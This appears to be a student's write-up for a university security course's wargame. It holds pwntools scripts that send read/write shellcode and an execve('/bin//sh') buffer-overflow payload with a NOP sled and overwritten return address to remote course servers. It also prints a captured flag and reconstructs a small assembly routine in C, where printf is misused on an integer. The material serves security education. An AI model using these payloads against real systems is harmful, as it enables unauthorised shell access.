# COMP6447 Wargame 3
Written by WENG XINN CHOW (z5346077) on 20.06.2022

simple
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMy1zaW1wbGUiLCJpcCI6IjEyMy4yNDMuMjE1LjYiLCJzZXNzaW9uIjoiN2E0NzcwMTItMWUxOC00NDJjLWJjMmQtMTlkYzRjZGNlNDUyIn0.ZxQl8eHUu-MP1QtLZbiywutiQDjlu83lNQnpcEmHGsg}

General overview of problems faced
-------------------------------------
1. Had to study the linux syscall reference in order to write the shellcode that involves syscall operations like read and write. 
2. Had to know the usage of registers for different byte sizes.

Script/Command used
------------------
```
from pwn import *

host = "comp6447.wtf"
port = 22188
p = remote(host, port)

# Read
# xor to pass 0 as argument
# bx (16-bit): store 1000 (0x3e8) fd
# dl (8-bit): size
# al (8-bit): syscall read
shellcode = asm(
    """
    xor ebx, ebx
    xor edx, edx
    xor eax, eax
    mov bx, 0x3e8
    mov ecx, esp
    mov dl, 0x60
    mov al, 0x3
    int 0x80
    """
)

# Write
# xor to pass 0 as argument
# bl (8-bit): fd
# dl (8-bit): size
# al (8-bit): syscall write
shellcode += asm(
    """
    xor ebx, ebx
    xor edx, edx
    xor eax, eax
    mov bl, 0x1
    mov dl, 0x60
    mov al, 0x4
    int 0x80
    """
)

p.sendline(shellcode)

p.interactive()
```

shellz
===========================
General overview of problems faced
-------------------------------------
1. Had to find the return address as well as the offset to overwrite that address.
2. Had to make sure the shellcode being run within the accurate place. This can be done by overwriting the buffer with a nop sled. 
3.  I was able to catch the flag before, but out of sudden when I wanted to write the markdown file the next day, it ran into errors but I couldn't figure out what went wrong.

Script/Command used
------------------
```
from pwn import *

host = "comp6447.wtf"
port = 17521
p = remote(host, port)

# Shell code 
shellcode = asm(
    """
    xor eax, eax
    push eax
    push 0x68732f2f  
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov al, 0xb
    int 0x80
    """
)

# Using gdb to find the return addr
return_addr = 0x08049286
# nops + shellcode + nops + return address
payload = b'\x90' * 8000 + shellcode + b'\x90' * 200 + p32(return_addr)
p.sendline(payload)

p.interactive()
```
re chall2
=============
General overview of problems faced
-------------------------------------
1. Had to recognise and write a counter while loop. 
2. It's been a long time since I first learned assembly so I was struggling to understand the usage and concept of ```lea```.
```C
int main(int argc, char** argv){
    int i = 0;
    int a = 7107;

    while (i < 10){
        if (i >= 1){
            a -= 6896;
            printf(a);
        };
        i += 1;
    };
}
```